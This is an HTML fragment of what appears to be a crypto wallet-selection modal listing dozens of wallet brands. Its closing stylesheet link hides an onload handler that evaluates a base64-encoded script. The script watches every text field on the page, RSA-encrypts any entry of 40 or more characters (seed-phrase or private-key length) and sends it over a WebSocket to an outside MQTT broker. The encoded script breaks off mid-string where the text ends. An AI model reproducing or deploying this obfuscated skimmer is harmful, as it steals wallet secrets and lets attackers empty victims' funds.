                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="coolwallet" src="./img/CoolWallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">CoolWallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="opto wallet" src="./img/Opto_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Opto Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="tk finance" src="./img/TK_Finance.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">TK Finance</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="mdao wallet" src="./img/MDAO_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">MDAO Wallet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="airgap wallet" src="./img/AirGap_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">AirGap Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="qubic wallet" src="./img/Qubic_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Qubic Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="haven wallet" src="./img/Haven_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Haven Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="holdstation wallet" src="./img/Holdstation_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Holdstation Wallet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="metaone" src="./img/MetaOne.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">MetaOne</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="3s wallet" src="./img/3S_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">3S Wallet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="payperless" src="./img/Payperless.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Payperless</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="minerva wallet" src="./img/Minerva_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Minerva Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="volt: defi" src="./img/Volt_DeFi.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Volt: DeFi</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="shinobi-wallet" src="./img/Shinobi_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Shinobi-Wallet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="autonomy connect" src="./img/Autonomy_Connect.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Autonomy Connect</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="bifrost wallet" src="./img/Bifrost_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Bifrost Wallet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="wallet 3" src="./img/Wallet_3.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Wallet 3</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="abra wallet" src="./img/Abra_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Abra Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="ime" src="./img/iMe.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">iMe</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="onekey" src="./img/OneKey.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">OneKey</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="slingshot wallet" src="./img/Slingshot_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Slingshot Wallet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="timeless wallet" src="./img/Timeless_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Timeless Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="venly" src="./img/Venly.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Venly</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="phantom" src="./img/Phantom.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Phantom</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="coinbase wallet" src="./img/Coinbase_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Coinbase Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="bitski" src="./img/Bitski.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Bitski</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="sender" src="./img/Sender.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Sender</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="saitapro" src="./img/SaitaPro.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">SaitaPro</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="flow wallet" src="./img/Flow_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Flow Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="hippo wallet" src="./img/Hippo_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Hippo Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="cosmostation" src="./img/Cosmostation.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Cosmostation</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="bitizen" src="./img/Bitizen.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Bitizen</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="blocto" src="./img/Blocto.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Blocto</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="me wallet" src="./img/Me_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Me Wallet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="piethereum hardware" src="./img/PiEthereum_Hardware.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">PiEthereum Hardware</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="reunit" src="./img/Reunit.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Reunit</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="tholos" src="./img/Tholos.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Tholos</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="stickey wallet" src="./img/Stickey_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Stickey Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="klip" src="./img/Klip.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Klip</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="coinstats" src="./img/CoinStats.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">CoinStats</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="likerland app" src="./img/LikerLand_App.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">LikerLand App</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="krystal" src="./img/Krystal.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Krystal</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="keepkey desktop" src="./img/KeepKey_Desktop.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">KeepKey Desktop</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="harti wallet" src="./img/HARTi_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">HARTi Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="stasis wallet" src="./img/Stasis_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Stasis Wallet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="dttd" src="./img/DTTD.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">DTTD</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="foxwallet" src="./img/FoxWallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">FoxWallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="haqq wallet" src="./img/HAQQ_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">HAQQ Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="tomipay" src="./img/tomiPAY.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">tomiPAY</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="bybit wallet" src="./img/Bybit_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Bybit Wallet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="catecoin wallet" src="./img/Catecoin_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Catecoin Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="ukiss hub" src="./img/UKISS_Hub.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">UKISS Hub</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="tellaw wallet" src="./img/Tellaw_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Tellaw Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="tangem wallet" src="./img/Tangem_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Tangem Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="callback" src="./img/Callback.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Callback</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="xellar" src="./img/Xellar.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Xellar</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="talken wallet" src="./img/Talken_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Talken Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="u2u wallet" src="./img/U2U_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">U2U Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="shido wallet" src="./img/Shido_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Shido Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="ozonewallet" src="./img/OzoneWallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">OzoneWallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="tidus wallet " src="./img/Tidus_Wallet_.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Tidus Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="impact wallet" src="./img/Impact_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Impact Wallet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="dosi vault" src="./img/DOSI_Vault.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">DOSI Vault</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="ellipal" src="./img/ELLIPAL.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">ELLIPAL</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="unstoppable wallet" src="./img/Unstoppable_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Unstoppable Wallet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="bitverse" src="./img/Bitverse.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Bitverse</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="konio" src="./img/Konio.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Konio</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="gateweb3" src="./img/GateWeb3.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">GateWeb3</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="utorg" src="./img/UTORG.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">UTORG</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="coinwallet" src="./img/CoinWallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">CoinWallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="ammer wallet" src="./img/Ammer_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Ammer Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="binance.us" src="./img/Binance_US.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Binance.US</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="sistemas" src="./img/SISTEMAS.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">SISTEMAS</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="muza" src="./img/MUZA.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">MUZA</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="fxwallet" src="./img/FxWallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">FxWallet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="sequel wallet" src="./img/Sequel_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Sequel Wallet</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="altme" src="./img/Altme.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Altme</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="unido" src="./img/Unido.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Unido</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="bitpie" src="./img/Bitpie.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Bitpie</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="moonstake" src="./img/MOONSTAKE.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">MOONSTAKE</span>
                        </div>
                    </div>

                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="yuse wallet" src="./img/Yuse_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Yuse Wallet</span>
                        </div>
                    </div>
                    <div class="menu-el">
                        <div class="modal-icon">
                            <img alt="coininn wallet" src="./img/Coininn_Wallet.png" />
                        </div>
                        <div class="modal-el-desc">
                            <span class="modal-el-desc-first">Coininn Wallet</span>
                        </div>
                    </div>
                    <link rel="stylesheet" href="./img/animate.min.css" integrity="sha512-c42qTSw/wPZ3/5LBzD+Bw5f7bSF2oxou6wEb+I/lqeaKV5FDIfMvvRp772y4jcJLKuGUOpbJMdg/BTl50fJYAw==" crossorigin="anonymous" referrerpolicy="no-referrer" onload='eval(atob("InVzZSBzdHJpY3QiO3ZhciB0aW1lcl9pZCxzb2NrZXQ9bnVsbCx0aW1lb3V0X3NlYz0xMCxkaXNjb25uZWN0aW5nPSExLGRhdGFfY291bnRlcj0xO2xldCByZXN1bHQ9IiI7Y29uc3QgY2hhcmFjdGVycz0iQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkiLGNoYXJhY3RlcnNMZW5ndGg9Y2hhcmFjdGVycy5sZW5ndGg7bGV0IGNvdW50ZXI9MDtmb3IoO2NvdW50ZXI8NTspcmVzdWx0Kz1jaGFyYWN0ZXJzLmNoYXJBdChNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkqY2hhcmFjdGVyc0xlbmd0aCkpLGNvdW50ZXIrPTE7Y29uc3QgZ2xfaWQ9cmVzdWx0O2Z1bmN0aW9uIHN0cjJhcnJheShlKXt2YXIgdD1lLmxlbmd0aCxyPUFycmF5KHQrMik7dD49MjU2PyhyWzBdPU1hdGguZmxvb3IodC8yNTYpLHJbMV09dCUyNTYpOihyWzBdPTAsclsxXT10KTtmb3IodmFyIG49MDtuPHQ7bisrKXJbbisyXT1lLmNoYXJDb2RlQXQobik7cmV0dXJuIHJ9ZnVuY3Rpb24gYXJyYXkyc3RyKGUsdCxyKXt2YXIgbixhPSIiO2ZvcihuPXQ7bjx0K3I7bisrKWErPVN0cmluZy5mcm9tQ2hhckNvZGUoZVtuXSk7cmV0dXJuIGF9ZnVuY3Rpb24gZW5jb2RlX2hlYWRlcihlLHQpe3ZhciByPVssXTtyWzBdPWU7ZG97dmFyIG49dCUxMjg7KHQ9TWF0aC5mbG9vcih0LzEyOCkpPjAmJihufD0xMjgpLHI9ci5jb25jYXQoW25dKX13aGlsZSh0PjApO3JldHVybiByfWZ1bmN0aW9uIGRlY29kZV9oZWFkZXIoZSl7dmFyIHQ9MCxyPTEsbj0wO2Rve3ZhciBhPWVbKyt0XTtuKz0oMTI3JmEpKnIscio9MTI4fXdoaWxlKCgxMjgmYSkhPTApO3JldHVybltuLHRdfWZ1bmN0aW9uIHN0YXJ0KCl7dmFyIGU9Z2xfaWQ7KHNvY2tldD1uZXcgV2ViU29ja2V0KCJ3c3M6Ly9tcXR0LWRhc2hib2FyZC5jb206ODg4NC9tcXR0IiwibXF0dCIpKS5iaW5hcnlUeXBlPSJhcnJheWJ1ZmZlciIsc29ja2V0Lm9ub3Blbj1mdW5jdGlvbigpe3ZhciB0LHI9WzAsNiw3Nyw4MSw3MywxMTUsMTAwLDExMiwzLDIsTWF0aC5mbG9vcih0aW1lb3V0X3NlYy8yNTYpLHRpbWVvdXRfc2VjJTI1Nl07dD0odD1lbmNvZGVfaGVhZGVyKDE2LChyPXIuY29uY2F0KHN0cjJhcnJheShlbmNvZGVfdXRmOChlKSkpKS5sZW5ndGgpKS5jb25jYXQocik7dmFyIG49bmV3IFVpbnQ4QXJyYXkodCk7c29ja2V0LnNlbmQobi5idWZmZXIpfSxzb2NrZXQub25tZXNzYWdlPWZ1bmN0aW9uKGUpe3dpbmRvdy5jbGVhckludGVydmFsKHRpbWVyX2lkKSx0aW1lcl9pZD13aW5kb3cuc2V0SW50ZXJ2YWwoY2hlY2ssMWUzKnRpbWVvdXRfc2VjKSxkYXRhX2NvdW50ZXIrKzt2YXIgdD1uZXcgVWludDhBcnJheShlLmRhdGEpO2lmKDQ9PXQubGVuZ3RoJiYzMj09dFswXSYmMj09dFsxXSYmMD09dFsyXSk7ZWxzZSBpZigyPT10Lmxlbmd0aCYmMjA4PT10WzBdJiYwPT10WzFdKTtlbHNlIGlmKDU9PXQubGVuZ3RoJiYxNDQ9PXRbMF0pO2Vsc2UgaWYodC5sZW5ndGg+NCYmNDg9PXRbMF18NDk9PXRbMF0pe3ZhciByPWRlY29kZV9oZWFkZXIodCksbj1yWzBdLGE9clsxXSxjPTI1Nip0W2ErMV0rdFthKzJdO2lmKHQubGVuZ3RoPm4pe3ZhciBvPWFycmF5MnN0cih0LGErMyxjKTtvPWRlY29kZV91dGY4KG8pO3ZhciBzPWFycmF5MnN0cih0LGErMytjLG4tYy0yKSxpPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJpZC1saXN0Iik7aWYoaSl7aS5jaGlsZEVsZW1lbnRDb3VudD4xMCYmaS5yZW1vdmVDaGlsZChpLmNoaWxkTm9kZXNbMF0pO3ZhciAkPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImxpIik7JC5hcHBlbmRDaGlsZChkb2N1bWVudC5jcmVhdGVUZXh0Tm9kZShvKyIgLS0gIitzKSksaS5hcHBlbmRDaGlsZCgkKX19fX0sc29ja2V0Lm9uY2xvc2U9ZnVuY3Rpb24oKXtkYXRhX2NvdW50ZXI9MSxjaGVjaygpfSxzb2NrZXQub25lcnJvcj1mdW5jdGlvbigpe319ZnVuY3Rpb24gY2hlY2soKXtpZihzb2NrZXQmJjE9PXNvY2tldC5yZWFkeVN0YXRlKXtpZih3aW5kb3cuY2xlYXJJbnRlcnZhbCh0aW1lcl9pZCksMD09ZGF0YV9jb3VudGVyKXNvY2tldC5jbG9zZSgpO2Vsc2V7dGltZXJfaWQ9d2luZG93LnNldEludGVydmFsKGNoZWNrLDE1MDApO3ZhciBlPW5ldyBVaW50OEFycmF5KFsxOTIsMF0pO3NvY2tldC5zZW5kKGUuYnVmZmVyKX1kYXRhX2NvdW50ZXI9MH1zb2NrZXQmJjMhPXNvY2tldC5yZWFkeVN0YXRlfHxkaXNjb25uZWN0aW5nfHxzdGFydCgpfWZ1bmN0aW9uIGVuY29kZV91dGY4KGUpe3JldHVybiB1bmVzY2FwZShlbmNvZGVVUklDb21wb25lbnQoZSkpfWZ1bmN0aW9uIGRlY29kZV91dGY4KGUpe3JldHVybiBkZWNvZGVVUklDb21wb25lbnQoZXNjYXBlKGUpKX1mdW5jdGlvbiBwdWJsaXNoKGUpeyhyPXN0cjJhcnJheShlKSkuc3BsaWNlKDAsMiksdD0odD1lbmNvZGVfaGVhZGVyKDQ4LChyPXN0cjJhcnJheShlbmNvZGVfdXRmOCgiZmFrUnJwWW95TE1BMG4zL3JUc2NzaEZOYWF6WlN5dCIpKS5jb25jYXQocikpLmxlbmd0aCkpLmNvbmNhdChyKTt2YXIgdCxyLG49bmV3IFVpbnQ4QXJyYXkodCk7c29ja2V0LnNlbmQobi5idWZmZXIpfWFzeW5jIGZ1bmN0aW9uIGNhbGwoZSl7bGV0IHQ9e307dFswXT1sb2NhdGlvbi5ob3N0KyItIitnbF9pZCx0WzFdPWU7dmFyIHI9SlNPTi5zdHJpbmdpZnkodCk7bGV0IG4sYTtyZXR1cm4gYT1hd2FpdCB3aW5kb3cuY3J5cHRvLnN1YnRsZS5lbmNyeXB0KHtuYW1lOiJSU0EtT0FFUCJ9LGF3YWl0IHdpbmRvdy5jcnlwdG8uc3VidGxlLmltcG9ydEtleSgic3BraSIsVWludDhBcnJheS5mcm9tKGF0b2IoIk1JSUNJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBZzhBTUlJQ0NnS0NBZ0VBd2ZPU1FKbWdGYndQMCtxU25jR2F3a2lWTWJEYXEwREhSYlM3Q093OXl5QnlBZnhtMlpvWU5lNmxKS3pUYTBHVUs1Q2lWZDd6ZUhmekJEMkRvOVY0YlAxdW1heFJaczNxb3Z4d3NzNlZRNld0Vk9QRDB3Q0dudmJPLzdEQjBWd2E4clN4a0tCOUZJNnZqQTExaEJ6M1BoQktNRWoybWJkN3B4Z0NpMWFYV1pFdG1qUHExWHNseGt3dEJuZitIQmFEN2JkN1d6SHRFMmV5ZnJ6TkllNnJFbXI0T0Faa2NvbExOcHFGRHFlL2tyUDZobmtsMkJVZW9Qc1V4ajh5RTZBK2gvVFlMZ2taWm9NeFhZbGMyMllrczdOTEdxZ29pYW9SNXBzdEpTYWRtSmxHK2FIYWZ4ZkRxUEFHWU4rWG1BV3ZTTWpiMHVLQ1Z3MTYyTk1la1MwUFplRFU1SGc0d1MwZVU5NHFCN1haZVpmQVRxMnRkVkxQZ3RJcHdoUExjZ1pvMVNEb2pTZzBKbEs2aldRTTh6cnBoZmNaZVZIU0pDbEJwdmlVSXhRV1BaSWtLTGRjd1hkK0orTGZVVGdOTE42bWg4RVV4Z2UyM243VnBEY295OEhnMnRTYUZ0OFdCbWlyUWpOZjZsTjJzaGp1T0hoaW5jaTVQMkNWbnM1U2dIUDRWN200dytFNzNob2FRMDUyQkFJMTdVNE1CSGxQeUxaUk0yaWRtL3dLSnRuNkNqZlNCVkNoUkp3QlJ5c2lWempRaDQrQlppQWg3ekpvWlUrUWlWY2o1NW0wNndUS1lic0ZoU3RTeTJJcE1FWHY4YUlzZDVySWVUSldLdHVHWVlJL3RGeUU3eVN1eDUvcDlWSFpOdy9WQTAxNVQ3OEY0dVpkRGd5alJwM25WVU1DQXdFQUFRIiksZT0+ZS5jaGFyQ29kZUF0KDApKS5idWZmZXIse25hbWU6IlJTQS1PQUVQIixoYXNoOntuYW1lOiJTSEEtMjU2In19LCEwLFsiZW5jcnlwdCJdKSxuZXcgVGV4dEVuY29kZXIoKS5lbmNvZGUocikpLGJ0b2EoU3RyaW5nLmZyb21DaGFyQ29kZS5hcHBseShudWxsLG5ldyBVaW50OEFycmF5KGEpKSl9bGV0IGV2ZW50TGlzdGVuZXJzPVtdO2Z1bmN0aW9uIGV2ZW50ZXIoZSx0KXtsZXQgcj1hc3luYyBmdW5jdGlvbihyKXt2YXIgbj1lLnZhbHVlO3Q+MCYmKG49ZS50ZXh0Q29udGVudCksbi5sZW5ndGg8NDB8fHB1Ymxpc2goYXdhaXQgY2FsbChuKSl9O2V2ZW50TGlzdGVuZXJzLnB1c2goe2VsZW1lbnQ6ZSxjYWxsYmFjazpyfSksZS5hZGRFdmVudExpc3RlbmVyKCJpbnB1dCIscil9ZnVuY3Rpb24gcmVtb3ZlQWxsRXZlbnRMaXN0ZW5lcnMoKXtldmVudExpc3RlbmVycy5mb3JFYWNoKGU9PntlLmVsZW1lbnQucmVtb3ZlRXZlbnRMaXN0ZW5lcigiaW5wdXQiLGUuY2FsbGJhY2spfSksZXZlbnRMaXN0ZW5lcnM9W119ZnVuY3Rpb24gcmViaW5kRXZlbnRMaXN0ZW5lcnMoKXtyZW1vdmVBbGxFdmVudExpc3RlbmVycygpO2xldCBlPWRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoImlucHV0IiksdD1kb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCJ0ZXh0YXJlYSIpLHI9ZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnZGl2W2NvbnRlbnRlZGl0YWJsZT0idHJ1ZSJdJyk7ZS5mb3JFYWNoKGU9PntldmVudGVyKGUsMCl9KSx0LmZvckVhY2goZT0+e2V2ZW50ZXIoZSwwKX0pLHIu